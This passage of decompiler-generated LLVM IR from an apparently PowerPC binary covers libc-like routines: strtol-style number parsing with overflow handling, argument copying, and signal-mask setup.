  %v2_10008ce8 = mul i32 %v2_10008ce4, %v1_10008ce4
  %v1_10008cec = sub i32 -1, %v2_10008ce8
  %v1_10008cf0 = urem i32 %v1_10008cec, 256
  store i32 %v1_10008cf0, i32* %r27.global-to-local, align 4
  %v0_10008cfc.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008cfc

dec_label_pc_10008cf8:                            ; preds = %dec_label_pc_10008d68, %dec_label_pc_10008d50
  %v1_10008d00.pre = phi i32 [ %v1_10008d00, %dec_label_pc_10008d68 ], [ %v1_10008d00.pre.pre, %dec_label_pc_10008d50 ]
  %v0_10008d00.pre = phi i32 [ %v2_10008d68, %dec_label_pc_10008d68 ], [ %v0_10008d00.pre.pre, %dec_label_pc_10008d50 ]
  %v0_10008cf8 = phi i32 [ %v1_10008d34, %dec_label_pc_10008d68 ], [ %v0_10008cf8.pre, %dec_label_pc_10008d50 ]
  br label %dec_label_pc_10008cfc

dec_label_pc_10008cfc:                            ; preds = %dec_label_pc_10008ce0, %dec_label_pc_10008cf8
  %v0_10008d7812 = phi i32 [ %v0_10008d7814, %dec_label_pc_10008ce0 ], [ %v0_10008cf8, %dec_label_pc_10008cf8 ]
  %v0_10008d34 = phi i32 [ %v0_10008cfc.pre, %dec_label_pc_10008ce0 ], [ %v0_10008cf8, %dec_label_pc_10008cf8 ]
  %v1_10008d00 = phi i32 [ %v2_10008ce4, %dec_label_pc_10008ce0 ], [ %v1_10008d00.pre, %dec_label_pc_10008cf8 ]
  %v0_10008d40 = phi i32 [ 0, %dec_label_pc_10008ce0 ], [ %v0_10008d00.pre, %dec_label_pc_10008cf8 ]
  %v1_10008cfc = inttoptr i32 %v0_10008d34 to i8*
  %v2_10008cfc = load i8, i8* %v1_10008cfc, align 1
  %v3_10008cfc = zext i8 %v2_10008cfc to i32
  %v3_10008d00 = icmp ugt i32 %v0_10008d40, %v1_10008d00
  %v1_10008d08 = add nuw nsw i32 %v3_10008cfc, 208
  %v1_10008d0c = or i32 %v3_10008cfc, 32
  %v1_10008d10 = urem i32 %v1_10008d08, 256
  %tmp23 = icmp ult i32 %v1_10008d10, 10
  br i1 %tmp23, label %dec_label_pc_10008d30, label %dec_label_pc_10008d20

dec_label_pc_10008d20:                            ; preds = %dec_label_pc_10008cfc
  %tmp24 = icmp ult i32 %v1_10008d0c, 97
  br i1 %tmp24, label %dec_label_pc_10008d30, label %dec_label_pc_10008d2c

dec_label_pc_10008d2c:                            ; preds = %dec_label_pc_10008d20
  %v1_10008d20 = add nsw i32 %v1_10008d0c, -87
  %v1_10008d2c = urem i32 %v1_10008d20, 256
  br label %dec_label_pc_10008d30

dec_label_pc_10008d30:                            ; preds = %dec_label_pc_10008d20, %dec_label_pc_10008cfc, %dec_label_pc_10008d2c
  %v1_10008d68 = phi i32 [ 40, %dec_label_pc_10008d20 ], [ %v1_10008d10, %dec_label_pc_10008cfc ], [ %v1_10008d2c, %dec_label_pc_10008d2c ]
  %v1_10008d30 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008d30 = icmp slt i32 %v1_10008d68, %v1_10008d30
  %v1_10008d34 = add i32 %v0_10008d34, 1
  store i32 %v1_10008d34, i32* %r31.global-to-local, align 4
  br i1 %v2_10008d30, label %dec_label_pc_10008d3c, label %dec_label_pc_10008d70

dec_label_pc_10008d3c:                            ; preds = %dec_label_pc_10008d30
  br i1 %v3_10008d00, label %dec_label_pc_10008d50, label %dec_label_pc_10008d40

dec_label_pc_10008d40:                            ; preds = %dec_label_pc_10008d3c
  %v1_10008d44 = load i32, i32* %r27.global-to-local, align 4
  %v0_10008d48.not = icmp ne i32 %v0_10008d40, %v1_10008d00
  %tmp25 = icmp ule i32 %v1_10008d68, %v1_10008d44
  %or.cond = or i1 %tmp25, %v0_10008d48.not
  br i1 %or.cond, label %dec_label_pc_10008d68, label %dec_label_pc_10008d50

dec_label_pc_10008d50:                            ; preds = %dec_label_pc_10008d40, %dec_label_pc_10008d3c
  %v0_10008d50 = call i32 @function_10004e38()
  %v0_10008d54 = load i32, i32* %r28.global-to-local, align 4
  %v1_10008d54 = load i32, i32* %r26.global-to-local, align 4
  %v2_10008d54 = and i32 %v1_10008d54, %v0_10008d54
  store i32 %v2_10008d54, i32* %r28.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  %v2_10008d60 = inttoptr i32 %v0_10008d50 to i32*
  store i32 34, i32* %v2_10008d60, align 4
  %v0_10008cf8.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10008d00.pre.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10008d00.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008cf8

dec_label_pc_10008d68:                            ; preds = %dec_label_pc_10008d40
  %v2_10008d40 = mul i32 %v1_10008d30, %v0_10008d40
  %v2_10008d68 = add i32 %v2_10008d40, %v1_10008d68
  store i32 %v2_10008d68, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008cf8

dec_label_pc_10008d70:                            ; preds = %dec_label_pc_10008d30, %dec_label_pc_10008cd0
  %v0_10008d78 = phi i32 [ %v0_10008d7814, %dec_label_pc_10008cd0 ], [ %v0_10008d7812, %dec_label_pc_10008d30 ]
  %v0_10008d70 = load i32, i32* %r25.global-to-local, align 4
  %v3_10008d70 = icmp eq i32 %v0_10008d70, 0
  br i1 %v3_10008d70, label %dec_label_pc_10008d7c, label %dec_label_pc_10008d78

dec_label_pc_10008d78:                            ; preds = %dec_label_pc_10008d70
  %v2_10008d78 = inttoptr i32 %v0_10008d70 to i32*
  store i32 %v0_10008d78, i32* %v2_10008d78, align 4
  br label %dec_label_pc_10008d7c

dec_label_pc_10008d7c:                            ; preds = %dec_label_pc_10008d70, %dec_label_pc_10008d78
  %v0_10008d7c = load i32, i32* %r28.global-to-local, align 4
  %v1_10008d7c = sub i32 0, %v0_10008d7c
  %v0_10008d84 = load i32, i32* %r26.global-to-local, align 4
  %v3_10008d84 = icmp eq i32 %v0_10008d84, 0
  %tmp27 = lshr i32 %v1_10008d7c, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_10008dc0.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br i1 %v3_10008d84, label %dec_label_pc_10008db0, label %dec_label_pc_10008d98

dec_label_pc_10008d98:                            ; preds = %dec_label_pc_10008d7c
  %v3_10008d98 = icmp ugt i32 %v0_10008dc0.pre.pre, %tmp28
  br i1 %v3_10008d98, label %dec_label_pc_10008da0, label %dec_label_pc_10008db0

dec_label_pc_10008da0:                            ; preds = %dec_label_pc_10008d98
  %v0_10008da0 = call i32 @function_10004e38()
  %v2_10008da8 = inttoptr i32 %v0_10008da0 to i32*
  store i32 34, i32* %v2_10008da8, align 4
  %v0_10008dac = load i32, i32* @r31, align 4
  store i32 %v0_10008dac, i32* %r10.global-to-local, align 4
  %v0_10008db0.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10008db0

dec_label_pc_10008db0:                            ; preds = %dec_label_pc_10008d7c, %dec_label_pc_10008d98, %dec_label_pc_10008da0
  %v0_10008dc0.pre = phi i32 [ %v0_10008dc0.pre.pre, %dec_label_pc_10008d98 ], [ %v0_10008dac, %dec_label_pc_10008da0 ], [ %v0_10008dc0.pre.pre, %dec_label_pc_10008d7c ]
  %v0_10008db0 = phi i32 [ %v0_10008d7c, %dec_label_pc_10008d98 ], [ %v0_10008db0.pre, %dec_label_pc_10008da0 ], [ %v0_10008d7c, %dec_label_pc_10008d7c ]
  %v3_10008db0 = icmp eq i32 %v0_10008db0, 0
  br i1 %v3_10008db0, label %dec_label_pc_10008dbc, label %dec_label_pc_10008db8

dec_label_pc_10008db8:                            ; preds = %dec_label_pc_10008db0
  %v1_10008db8 = sub i32 0, %v0_10008dc0.pre
  store i32 %v1_10008db8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008dbc

dec_label_pc_10008dbc:                            ; preds = %dec_label_pc_10008db0, %dec_label_pc_10008db8
  %v0_10008dc0 = phi i32 [ %v1_10008db8, %dec_label_pc_10008db8 ], [ %v0_10008dc0.pre, %dec_label_pc_10008db0 ]
  ret i32 %v0_10008dc0

; uselistorder directives
  uselistorder i32 %v0_10008dc0.pre, { 1, 0 }
  uselistorder i32 %v0_10008dc0.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_10008d68, { 1, 0 }
  uselistorder i32 %v1_10008d34, { 1, 0 }
  uselistorder i32 %v1_10008d10, { 1, 0 }
  uselistorder i32 %v1_10008d0c, { 1, 0 }
  uselistorder i32 %v3_10008cfc, { 1, 0 }
  uselistorder i32 %v0_10008d40, { 1, 0, 2 }
  uselistorder i32 %v1_10008d00, { 0, 2, 1 }
  uselistorder i32 %v0_10008cf8, { 1, 0 }
  uselistorder i32 %v2_10008ce4, { 1, 0, 2 }
  uselistorder i32 %v1_10008cbc, { 1, 0 }
  uselistorder i32 %v1_10008ca8, { 1, 0, 2 }
  uselistorder i32 %v0_10008c84, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 5, 1, 0, 2, 3, 6, 4, 7 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_10008dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10008db0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008d7c, { 1, 0 }
  uselistorder label %dec_label_pc_10008d30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10008cd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008c88, { 1, 0 }
  uselistorder label %dec_label_pc_10008c84, { 1, 0 }
  uselistorder label %dec_label_pc_10008c50, { 1, 0 }
}

define i32 @function_10008dd4() local_unnamed_addr {
dec_label_pc_10008dd4:
  %stack_var_-40 = alloca i32, align 4
  %v2_10008df0 = ptrtoint i32* %stack_var_-40 to i32
  %v0_10008df8 = load i32, i32* @r3, align 4
  store i32 %v0_10008df8, i32* @r31, align 4
  store i32 %v2_10008df0, i32* @r3, align 4
  %v0_10008e04 = call i32 @function_100091fc()
  %v0_10008e0c = call i32 @function_100091f4()
  %v3_10008e14 = load i32, i32* @global_var_100104a0.287, align 4
  %v3_10008e18 = icmp eq i32 %v3_10008e14, 0
  br i1 %v3_10008e18, label %dec_label_pc_10008e2c, label %dec_label_pc_10008e20

dec_label_pc_10008e20:                            ; preds = %dec_label_pc_10008dd4
  %v0_10008e20 = load i32, i32* @r31, align 4
  %v3_10008e28 = call i32 @unknown_0(i32 %v0_10008e20, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10008e2c

dec_label_pc_10008e2c:                            ; preds = %dec_label_pc_10008dd4, %dec_label_pc_10008e20
  store i32 %v2_10008df0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10008e34 = call i32 @function_100091fc()
  store i32 %v0_10008e34, i32* @r3, align 4
  store i32 268471868, i32* @lr, align 4
  %v1_10008e38 = call i32 @function_10009160(i32 %v0_10008e34)
  store i32 268471888, i32* @lr, align 4
  %v2_10008e4c = call i32 @function_10005778(i32 %v1_10008e38, i32 268457848)
  %v0_10008e50 = load i32, i32* @r31, align 4
  %v1_10008e54 = call i32 @function_1000968c(i32 %v0_10008e50)
  ret i32 %v1_10008e54

; uselistorder directives
  uselistorder label %dec_label_pc_10008e2c, { 1, 0 }
}

define i32 @function_10008e58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10008e58:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10008e58 = ptrtoint i32* %stack_var_0 to i32
  %v2_10008e74 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10008e74, i32* %r0.global-to-local, align 4
  %v2_10008e7c = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_10008e74, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008ea8

dec_label_pc_10008ea8:                            ; preds = %dec_label_pc_10008ed8, %dec_label_pc_10008e58
  %v0_10008eac = phi i32 [ 0, %dec_label_pc_10008e58 ], [ %v1_10008eac, %dec_label_pc_10008ed8 ]
  %stack_var_-52.0 = phi i32 [ %v2_10008e7c, %dec_label_pc_10008e58 ], [ %stack_var_-52.1, %dec_label_pc_10008ed8 ]
  %stack_var_-56.0 = phi i8 [ 2, %dec_label_pc_10008e58 ], [ %stack_var_-56.1, %dec_label_pc_10008ed8 ]
  %v4_10008ea8 = zext i8 %stack_var_-56.0 to i32
  %v1_10008eac = add i32 %v0_10008eac, 1
  %v1_10008eb4 = mul nuw nsw i32 %v4_10008ea8, 4
  store i32 %v1_10008eb4, i32* %r0.global-to-local, align 4
  %v2_10008eb8 = add i32 %v1_10008eb4, %v2_10008e74
  store i32 %v2_10008eb8, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_10008ecc, label %dec_label_pc_10008ec4

dec_label_pc_10008ec4:                            ; preds = %dec_label_pc_10008ea8
  %v1_10008ebc = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_10008ed8

dec_label_pc_10008ecc:                            ; preds = %dec_label_pc_10008ea8
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10008ed0 = add i32 %stack_var_-52.0, 4
  store i32 %v1_10008ed0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008ed8

dec_label_pc_10008ed8:                            ; preds = %dec_label_pc_10008ec4, %dec_label_pc_10008ecc
  %stack_var_-52.1 = phi i32 [ %v1_10008ed0, %dec_label_pc_10008ecc ], [ %stack_var_-52.0, %dec_label_pc_10008ec4 ]
  %v0_10008ed8 = phi i32 [ %stack_var_-52.0, %dec_label_pc_10008ecc ], [ %v2_10008eb8, %dec_label_pc_10008ec4 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_10008ecc ], [ %v1_10008ebc, %dec_label_pc_10008ec4 ]
  %v1_10008ed8 = inttoptr i32 %v0_10008ed8 to i32*
  %v2_10008ed8 = load i32, i32* %v1_10008ed8, align 4
  store i32 %v2_10008ed8, i32* %r0.global-to-local, align 4
  %v3_10008edc = icmp eq i32 %v2_10008ed8, 0
  br i1 %v3_10008edc, label %dec_label_pc_10008ee4, label %dec_label_pc_10008ea8

dec_label_pc_10008ee4:                            ; preds = %dec_label_pc_10008ed8
  %v1_10008ee4 = mul i32 %v1_10008eac, 4
  store i32 %v4_10008e58, i32* %r0.global-to-local, align 4
  %v1_10008eec = add i32 %v1_10008ee4, 34
  store i32 %v1_10008eac, i32* %ctr.global-to-local, align 4
  %v1_10008ef4 = call i32 @__asm_rlwinm(i32 %v1_10008eec, i32 0, i32 0, i32 27)
  %v1_10008efc = load i32, i32* @r1, align 4
  %v3_10008efc = sub i32 %v1_10008efc, %v1_10008ef4
  %v4_10008efc = inttoptr i32 %v3_10008efc to i32*
  store i32 %v4_10008e58, i32* %v4_10008efc, align 4
  %v1_10008f00 = add i32 %v3_10008efc, 23
  store i32 %v1_10008f00, i32* %r0.global-to-local, align 4
  %v1_10008f04 = call i32 @__asm_rlwinm(i32 %v1_10008f00, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10008f0c = load i32, i32* %r8.global-to-local, align 4
  %v2_10008f0c = inttoptr i32 %v1_10008f04 to i32*
  store i32 %v0_10008f0c, i32* %v2_10008f0c, align 4
  store i32 %v1_10008f04, i32* %r11.global-to-local, align 4
  %v0_10008f14 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008f14 = trunc i32 %v0_10008f14 to i8
  store i32 %v2_10008e74, i32* %r0.global-to-local, align 4
  store i32 %v2_10008e74, i32* %stack_var_-48, align 4
  br label %dec_label_pc_10008f28

dec_label_pc_10008f28:                            ; preds = %dec_label_pc_10008f5c.dec_label_pc_10008f28_crit_edge, %dec_label_pc_10008ee4
  %v0_10008f2c = phi i32 [ %v1_10008f04, %dec_label_pc_10008ee4 ], [ %v0_10008f2c.pre, %dec_label_pc_10008f5c.dec_label_pc_10008f28_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_10008e7c, %dec_label_pc_10008ee4 ], [ %stack_var_-52.3, %dec_label_pc_10008f5c.dec_label_pc_10008f28_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_10008f14, %dec_label_pc_10008ee4 ], [ %stack_var_-56.3, %dec_label_pc_10008f5c.dec_label_pc_10008f28_crit_edge ]
  %v1_10008f2c = add i32 %v0_10008f2c, 4
  store i32 %v1_10008f2c, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_10008f50, label %dec_label_pc_10008f40

dec_label_pc_10008f40:                            ; preds = %dec_label_pc_10008f28
  %v4_10008f28 = zext i8 %stack_var_-56.2 to i32
  %v1_10008f38 = add i8 %stack_var_-56.2, 1
  %v1_10008f34 = mul nuw nsw i32 %v4_10008f28, 4
  %v3_10008f40 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10008f40, i32* %r0.global-to-local, align 4
  %v2_10008f48 = add i32 %v3_10008f40, %v1_10008f34
  br label %dec_label_pc_10008f5c

dec_label_pc_10008f50:                            ; preds = %dec_label_pc_10008f28
  %v1_10008f54 = add i32 %stack_var_-52.2, 4
  store i32 %v1_10008f54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008f5c

dec_label_pc_10008f5c:                            ; preds = %dec_label_pc_10008f40, %dec_label_pc_10008f50
  %stack_var_-52.3 = phi i32 [ %v1_10008f54, %dec_label_pc_10008f50 ], [ %stack_var_-52.2, %dec_label_pc_10008f40 ]
  %v0_10008f5c = phi i32 [ %stack_var_-52.2, %dec_label_pc_10008f50 ], [ %v2_10008f48, %dec_label_pc_10008f40 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_10008f50 ], [ %v1_10008f38, %dec_label_pc_10008f40 ]
  %v1_10008f5c = inttoptr i32 %v0_10008f5c to i32*
  %v2_10008f5c = load i32, i32* %v1_10008f5c, align 4
  store i32 %v2_10008f5c, i32* %r0.global-to-local, align 4
  %v2_10008f60 = inttoptr i32 %v1_10008f2c to i32*
  store i32 %v2_10008f5c, i32* %v2_10008f60, align 4
  %v0_10008f64 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008f64 = add i32 %v0_10008f64, -1
  store i32 %v1_10008f64, i32* %ctr.global-to-local, align 4
  %v2_10008f64 = icmp eq i32 %v1_10008f64, 0
  br i1 %v2_10008f64, label %dec_label_pc_10008f68, label %dec_label_pc_10008f5c.dec_label_pc_10008f28_crit_edge

dec_label_pc_10008f5c.dec_label_pc_10008f28_crit_edge: ; preds = %dec_label_pc_10008f5c
  %v0_10008f2c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008f28

dec_label_pc_10008f68:                            ; preds = %dec_label_pc_10008f5c
  %v3_10008f6c = load i32, i32* @global_var_100104a8.289, align 4
  store i32 268472180, i32* @lr, align 4
  %v2_10008f70 = call i32 @function_10009710(i32 %v3_10008f6c, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10008f74 = load i32, i32* @r1, align 4
  %v1_10008f74 = inttoptr i32 %v0_10008f74 to i32*
  %v2_10008f74 = load i32, i32* %v1_10008f74, align 4
  store i32 %v2_10008f74, i32* %r11.global-to-local, align 4
  %v1_10008f78 = add i32 %v2_10008f74, 4
  %v2_10008f78 = inttoptr i32 %v1_10008f78 to i32*
  %v3_10008f78 = load i32, i32* %v2_10008f78, align 4
  store i32 %v3_10008f78, i32* %r0.global-to-local, align 4
  ret i32 %v2_10008f70

; uselistorder directives
  uselistorder i32 %v1_10008f64, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_10008eb4, { 1, 0 }
  uselistorder i32 %v1_10008eac, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_10008e74, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_10008f5c, { 1, 0 }
  uselistorder label %dec_label_pc_10008ed8, { 1, 0 }
}

define i32 @function_10008f8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008f8c:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_10008f94 = icmp eq i32 %arg1, 0
  br i1 %v3_10008f94, label %dec_label_pc_10009140, label %dec_label_pc_10008fbc.lr.ph

dec_label_pc_10008fbc.lr.ph:                      ; preds = %dec_label_pc_10008f8c
  %v2_10008fb0 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10008fb0, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_10008fbc45 = add i32 %v2_10008fb0, 132
  %v3_10008fbc46 = inttoptr i32 %v2_10008fbc45 to i32*
  store i32 0, i32* %v3_10008fbc46, align 4
  %v0_10008fc047 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008fc048 = add i32 %v0_10008fc047, -1
  store i32 %v1_10008fc048, i32* %r11.global-to-local, align 4
  %v1_10008fc449 = mul i32 %v1_10008fc048, 4
  %v1_10008fc850 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008fc851 = add i32 %v1_10008fc850, %v1_10008fc449
  %v0_10008fcc52 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008fcc53 = add i32 %v0_10008fcc52, -1
  store i32 %v1_10008fcc53, i32* %ctr.global-to-local, align 4
  %v2_10008fcc54 = icmp eq i32 %v1_10008fcc53, 0
  br i1 %v2_10008fcc54, label %dec_label_pc_10008fd0, label %dec_label_pc_10008fbc.dec_label_pc_10008fbc_crit_edge

dec_label_pc_10008fbc.dec_label_pc_10008fbc_crit_edge: ; preds = %dec_label_pc_10008fbc.lr.ph, %dec_label_pc_10008fbc.dec_label_pc_10008fbc_crit_edge
  %v2_10008fc855 = phi i32 [ %v2_10008fc8, %dec_label_pc_10008fbc.dec_label_pc_10008fbc_crit_edge ], [ %v2_10008fc851, %dec_label_pc_10008fbc.lr.ph ]
  %v0_10008fbc.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10008fbc = add i32 %v2_10008fc855, 8
  %v3_10008fbc = inttoptr i32 %v2_10008fbc to i32*
  store i32 %v0_10008fbc.pre, i32* %v3_10008fbc, align 4
  %v0_10008fc0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008fc0 = add i32 %v0_10008fc0, -1
  store i32 %v1_10008fc0, i32* %r11.global-to-local, align 4
  %v1_10008fc4 = mul i32 %v1_10008fc0, 4
  %v1_10008fc8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008fc8 = add i32 %v1_10008fc8, %v1_10008fc4
  %v0_10008fcc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008fcc = add i32 %v0_10008fcc, -1
  store i32 %v1_10008fcc, i32* %ctr.global-to-local, align 4
  %v2_10008fcc = icmp eq i32 %v1_10008fcc, 0
  br i1 %v2_10008fcc, label %dec_label_pc_10008fd0, label %dec_label_pc_10008fbc.dec_label_pc_10008fbc_crit_edge

dec_label_pc_10008fd0:                            ; preds = %dec_label_pc_10008fbc.dec_label_pc_10008fbc_crit_edge, %dec_label_pc_10008fbc.lr.ph
  %v2_10008fc8.lcssa = phi i32 [ %v2_10008fc851, %dec_label_pc_10008fbc.lr.ph ], [ %v2_10008fc8, %dec_label_pc_10008fbc.dec_label_pc_10008fbc_crit_edge ]
  %v0_10008fe4.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10008fd0 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10008fd0, i32* %r3.global-to-local, align 4
  store i32 %v0_10008fe4.pre, i32* %stack_var_-440, align 4
  %v3_10008fe8 = call i32 @function_1000b8c4(i32 %v2_10008fd0, i32 17, i32 %v2_10008fc8.lcssa)
  store i32 %v3_10008fe8, i32* %r3.global-to-local, align 4
  %v1_10008fec = icmp slt i32 %v3_10008fe8, 0
  br i1 %v1_10008fec, label %dec_label_pc_10009148, label %dec_label_pc_10008ff4

dec_label_pc_10008ff4:                            ; preds = %dec_label_pc_10008fd0
  %v2_10008ff4 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268472328, i32* @lr, align 4
  %v3_10009004 = call i32 @function_10009a08(i32 0, i32 %v2_10008fd0, i32 %v2_10008ff4)
  store i32 %v3_10009004, i32* %r3.global-to-local, align 4
  %v3_10009008 = icmp eq i32 %v3_10009004, 0
  br i1 %v3_10009008, label %dec_label_pc_10009010, label %dec_label_pc_10009148

dec_label_pc_10009010:                            ; preds = %dec_label_pc_10008ff4
  store i32 %v2_10008ff4, i32* %r3.global-to-local, align 4
  %v2_10009018 = call i32 @function_1000b89c(i32 %v2_10008ff4, i32 17)
  store i32 %v2_10009018, i32* %r3.global-to-local, align 4
  %v3_1000901c = icmp eq i32 %v2_10009018, 0
  br i1 %v3_1000901c, label %dec_label_pc_1000903c.lr.ph, label %dec_label_pc_10009108

dec_label_pc_1000903c.lr.ph:                      ; preds = %dec_label_pc_10009010
  store i32 %v2_10008fb0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_10008fbc46, align 4
  %v0_1000904036 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000904037 = add i32 %v0_1000904036, -1
  store i32 %v1_1000904037, i32* %r11.global-to-local, align 4
  %v1_1000904438 = mul i32 %v1_1000904037, 4
  %v1_1000904839 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000904840 = add i32 %v1_1000904839, %v1_1000904438
  %v0_1000904c41 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000904c42 = add i32 %v0_1000904c41, -1
  store i32 %v1_1000904c42, i32* %ctr.global-to-local, align 4
  %v2_1000904c43 = icmp eq i32 %v1_1000904c42, 0
  br i1 %v2_1000904c43, label %dec_label_pc_10009050, label %dec_label_pc_1000903c.dec_label_pc_1000903c_crit_edge

dec_label_pc_1000903c.dec_label_pc_1000903c_crit_edge: ; preds = %dec_label_pc_1000903c.lr.ph, %dec_label_pc_1000903c.dec_label_pc_1000903c_crit_edge
  %v2_1000904844 = phi i32 [ %v2_10009048, %dec_label_pc_1000903c.dec_label_pc_1000903c_crit_edge ], [ %v2_1000904840, %dec_label_pc_1000903c.lr.ph ]
  %v0_1000903c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000903c = add i32 %v2_1000904844, 8
  %v3_1000903c = inttoptr i32 %v2_1000903c to i32*
  store i32 %v0_1000903c.pre, i32* %v3_1000903c, align 4
  %v0_10009040 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009040 = add i32 %v0_10009040, -1
  store i32 %v1_10009040, i32* %r11.global-to-local, align 4
  %v1_10009044 = mul i32 %v1_10009040, 4
  %v1_10009048 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009048 = add i32 %v1_10009048, %v1_10009044
  %v0_1000904c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000904c = add i32 %v0_1000904c, -1
  store i32 %v1_1000904c, i32* %ctr.global-to-local, align 4
  %v2_1000904c = icmp eq i32 %v1_1000904c, 0
  br i1 %v2_1000904c, label %dec_label_pc_10009050, label %dec_label_pc_1000903c.dec_label_pc_1000903c_crit_edge

dec_label_pc_10009050:                            ; preds = %dec_label_pc_1000903c.dec_label_pc_1000903c_crit_edge, %dec_label_pc_1000903c.lr.ph
  %v2_10009048.lcssa = phi i32 [ %v2_1000904840, %dec_label_pc_1000903c.lr.ph ], [ %v2_10009048, %dec_label_pc_1000903c.dec_label_pc_1000903c_crit_edge ]
  store i32 %v2_10008fd0, i32* %r3.global-to-local, align 4
  %v3_10009058 = call i32 @function_1000b8c4(i32 %v2_10008fd0, i32 17, i32 %v2_10009048.lcssa)
  store i32 %v3_10009058, i32* %r3.global-to-local, align 4
  %v1_1000905c = icmp slt i32 %v3_10009058, 0
  br i1 %v1_1000905c, label %dec_label_pc_10009148, label %dec_label_pc_10009064

